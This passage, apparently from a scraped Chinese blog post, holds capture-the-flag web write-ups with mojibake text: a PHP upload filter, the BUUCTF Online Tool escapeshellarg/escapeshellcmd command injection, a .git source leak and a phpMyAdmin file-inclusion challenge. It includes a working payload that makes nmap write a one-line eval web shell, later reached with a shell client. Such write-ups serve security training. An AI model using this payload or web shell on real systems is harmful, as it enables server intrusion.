double-quoted-string\">\"/\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$uploaded_name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$uploaded_ext</span>  <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_name</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_name</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'.'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$uploaded_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'size'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$uploaded_tmp</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'uploaded'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ph/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_ext</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"åç¼€åä¸èƒ½æœ‰phï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"uploaded\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"\n            \"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"uploaded\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"image/jpeg\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"uploaded\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"type\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"image/pjpeg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"uploaded\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"size\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">2048</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_tmp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&lt;\\?/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"è¯¶ï¼Œåˆ«è’™æˆ‘å•Šï¼Œè¿™æ ‡å¿—æ˜æ˜¾è¿˜æ˜¯phpå•Š\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n                <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token function\">iconv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"UTF-8\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"GBK\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$target_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0777</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$uploaded_tmp</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$t_path</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- --></span><span class=\"token variable\">$t_path</span><span class=\"token punctuation\">}</span></span> succesfully uploaded!\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ä¸Šä¼ ç±»å‹ä¹Ÿå¤ªéœ²éª¨äº†å§ï¼\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>è¿™é‡Œåªå…è®¸jpegæ ¼å¼çš„å›¾ç‰‡ä¸Šä¼ ï¼Œè€Œä¸”size&lt;2048</p>\n<h1><a id=\"BUUCTF_2018Online_Tool_1640\"></a>[BUUCTF 2018]Online Tool</h1>\n<p><strong>é¢˜ç›®ç±»å‹</strong>ï¼š<code>rce</code> + <code>escapeshellargä¸escapeshellcmdå…±ç”¨æ¼æ´</code></p>\n<p>å…ˆäº†è§£ä¸€ä¸‹<code>escapeshellargï¼ˆï¼‰</code>å’Œ<code>escapeshellcmdï¼ˆï¼‰</code>å‡½æ•°<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\79776482432847d8bd4f3b1a2e321f67.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\f23de6281577451f8c29ed538208a937.png\"/></p>\n<p>Egï¼š</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token variable\">$dir</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"a'\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">escapeshellarg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">escapeshellcmd</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token function\">escapeshellcmd</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">print</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">print</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">print</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\næ‰§è¡Œç»“æœä¸ºï¼š\n<span class=\"token string single-quoted-string\">'a'</span>\\<span class=\"token string single-quoted-string\">''</span><span class=\"token string single-quoted-string\">'\n'</span>a<span class=\"token string single-quoted-string\">'\\\\'</span>'\\'\na\\'\n</code></pre>\n<p><strong>æ¼æ´ç‚¹</strong>ï¼šå•ç‹¬ä½¿ç”¨<code>escapeshellarg</code> å’Œ<code>escapeshellcmd</code> ä¸­ä»»æ„ä¸€ä¸ªéƒ½ä¸ä¼šå‡ºç°é—®é¢˜ï¼Œæˆ–è€…å…ˆä½¿ç”¨<code>escapeshellcmd</code>å†ä½¿ç”¨<code>escapeshellarg</code> ä¹Ÿä¸ä¼šå‡ºç°é—®é¢˜ï¼Œå”¯æœ‰é¢˜ç›®ä¸­å…ˆ<code>escapeshellarg</code> åœ¨<code>escapeshellcmd</code> ä¼šæœ‰æ¼æ´</p>\n<p><strong>åšé¢˜æ€è·¯</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>    <span class=\"token comment\">//è·å–IP</span>\n    <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'HTTP_X_FORWARDED_FOR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'host'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//å¯¹æ–‡ä»¶è¯­æ³•è¿›è¡Œé«˜äº®æ˜¾ç¤º</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$host</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'host'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$host</span> <span class=\"token operator\">=</span> <span class=\"token function\">escapeshellarg</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$host</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//æŠŠå­—ç¬¦ä¸²è½¬ç æˆå¯ä»¥åœ¨shellå‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°ï¼Œå°†å•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œè½¬ä¹‰ä¹‹åï¼Œå†åœ¨å·¦å³åŠ å•å¼•å·</span>\n    <span class=\"token variable\">$host</span> <span class=\"token operator\">=</span> <span class=\"token function\">escapeshellcmd</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$host</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰,å°†&amp;#;`|*?~&lt;&gt;^()[]{}$\\, \\x0Aå’Œ\\xFFä»¥åŠä¸é…å¯¹çš„å•/åŒå¼•å·è½¬ä¹‰</span>\n    <span class=\"token variable\">$sandbox</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"glzjin\"</span><span class=\"token operator\">.</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'you are in sandbox '</span><span class=\"token operator\">.</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">;</span>\n    @<span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">//æ–°å»ºç›®å½•ï¼Œé»˜è®¤æƒé™ï¼Œæœ€å¤§å¯èƒ½çš„è®¿é—®æƒ</span>\n    <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">//æ”¹å˜ç›®å½•è·¯å¾„ï¼ŒæˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›false</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nmap -T5 -sT -Pn --host-timeout 2 -F \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$host</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// -sTï¼Œåœ¨ç›®æ ‡ä¸»æœºçš„æ—¥å¿—ä¸Šè®°å½•å¤§æ‰¹è¿æ¥è¯·æ±‚å’Œé”™è¯¯çš„ä¿¡æ¯</span>\n    <span class=\"token comment\">// -Pnï¼Œæ‰«æä¹‹å‰ä¸éœ€è¦ç”¨pingå‘½ä»¤ï¼Œæœ‰äº›é˜²ç«å¢™ç¦æ­¢ä½¿ç”¨pingå‘½ä»¤</span>\n    <span class=\"token comment\">// -T5ï¼Œæ—¶é—´ä¼˜åŒ–å‚æ•°ï¼Œ-T0~5ï¼Œ-T0æ‰«æç«¯å£çš„å‘¨æœŸå¤§çº¦ä¸º5åˆ†é’Ÿï¼Œ-T5å¤§çº¦ä¸º5ç§’é’Ÿ</span>\n    <span class=\"token comment\">// --host-timeé™åˆ¶æ‰«ææ—¶é—´</span>\n    <span class=\"token comment\">// -Fï¼Œå¿«é€Ÿæ‰«æ</span>\n</code></pre>\n<p>ä»£ç å®¡è®¡<code>system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host);</code><br/> æ‰€ä»¥æˆ‘ä»¬ç°åœ¨éœ€è¦æ„é€ å˜é‡hostçš„å€¼ï¼Œä½¿è¿œç¨‹å‘½ä»¤/ä»£ç èƒ½å¤Ÿæ‰§è¡Œ</p>\n<p>è¿™é‡Œåˆéœ€è¦äº†è§£ä¸€äº›nmapçš„çŸ¥è¯†ç‚¹ï¼šåœ¨nmapå‘½ä»¤ä¸­ æœ‰ä¸€ä¸ªå‚æ•°<code>-oG</code>å¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™åˆ°æ–‡ä»¶ã€‚å¯ä»¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå†ç”¨èšå‰‘é“¾æ¥ï¼Œå°±å¯ä»¥é¡ºåˆ©æ‹¿åˆ°flagäº†</p>\n<p>æ„é€ payloadï¼š<code>?host=' &lt;?php @eval($_POST[\"hack\"]);?&gt; -oG hack.php '</code></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\9bd940022f314cc880aa4b09a3166bfa.png\"/>ç„¶åè¿™é‡Œè¿”å›æ–‡ä»¶åï¼Œç»§ç»­ç”¨èšå‰‘é“¾æ¥</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\6071c4bbad454b0294f3fd5584d1ade1.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\873a8cafdb874d83808caca0fffc218b.png\"/><br/> æ‹¿åˆ°flag</p>\n<h1><a id=\"RoarCTF_2019Easy_Java_1709\"></a>[RoarCTF 2019]Easy Java</h1>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\09b6f0c5558d4bcfa83406fb57f53408.png\"/><br/> ç‚¹å‡»helpï¼Œå‘ç°æç¤ºï¼š<code>java.io.FileNotFoundException:{help.docx}</code>ï¼Œè®¿é—®help,doxï¼Œå¥½å§ï¼Œå•¥ä¹Ÿä¸æ˜¯<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\d215fbe7e1a748e29ebbb1e518e8d2a0.png\"/></p>\n<h1><a id=\"GXYCTF2019_1717\"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h1>\n<p><strong>é¢˜ç›®ç±»å‹</strong>ï¼š<code>.git</code>æºç æ³„éœ² + æ— å‚rce<br/> ç”¨GitHackæ‰«ä¸€ä¸‹ç›®å½•ï¼š<code>python GitHacker.py http://f788ff9a-e4f3-46f1-8eff-6b1ce92932f3.node4.buuoj.cn:81/.git/</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\ca561aded02541ff8597532c7bee735c.png\"/>å‘ç°index.phpï¼š<code>http://f788ff9a-e4f3-46f1-8eff-6b1ce92932f3.node4.buuoj.cn:81/.git/index</code><br/> è®¿é—®ä¸€ä¸‹<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\6aa43e8efade47a7951c6c044b27b0d7.png\"/></p>\n<h1><a id=\"GWCTF_2019_1725\"></a>[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h1>\n<p><strong>é¢˜ç›®ç±»å‹</strong>ï¼šcve-2018-12613-PhpMyadminåå°æ–‡ä»¶åŒ…å«æ¼æ´<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\517b58dea3c34a24a721a3e6af593bec.png\"/><br/> ä¸€çœ‹å°±æ²¡æœ‰utf-8ç¼–ç ï¼Œç¼–ç åä¸º<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\5246fc8df10b4ec48a7645339f4cfc7e.png\"/></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 1, "javascript": 0, "java": 1, "sql": 1, "php": 1, "time": "2021-08-12 12:21:17", "summary": "æå®¢å¤§æŒ‘æˆ˜æå®¢å¤§æŒ‘æˆ˜å¼ºç½‘æ¯éšä¾¿æ³¨æ–°ç”Ÿèµ›æå®¢å¤§æŒ‘æˆ˜æ–°ç”Ÿèµ›æå®¢å¤§æŒ‘æˆ˜æå®¢å¤§æŒ‘æˆ˜æå®¢å¤§æŒ‘æˆ˜æå®¢å¤§æŒ‘æˆ˜æå®¢å¤§æŒ‘æˆ˜æŠ¤ç½‘æ¯æ–°ç”Ÿèµ›æå®¢å¤§æŒ‘æˆ˜æ–°ç”Ÿèµ›æå®¢å¤§æŒ‘æˆ˜æå®¢å¤§æŒ‘æˆ˜ç½‘é¼æ¯é’é¾™ç»„ä½ ä¼ ä½ å‘¢ååŒ—èµ›åŒºç½‘é¼æ¯ç¦æ­¢å¥—å¨ƒæˆ‘æœ‰ä¸€"}